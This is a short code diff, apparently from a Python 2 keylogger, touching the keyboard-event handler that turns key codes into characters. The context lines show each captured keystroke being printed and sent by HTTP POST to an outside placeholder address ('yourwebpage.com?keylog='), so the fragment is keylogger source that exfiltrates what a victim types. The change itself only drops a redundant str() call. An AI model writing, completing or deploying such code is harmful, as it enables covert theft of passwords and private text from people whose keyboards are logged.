@@ -26,7 +26,7 @@ def onKeyboardEvent(event):
     elif event.Ascii == 18:
         key = "<ALT>"
     else:
-        key = str(chr(event.Ascii))
+        key = chr(event.Ascii)
         print key
     resp = requests.post("http://yourwebpage.com?keylog="+str(key))
     return True
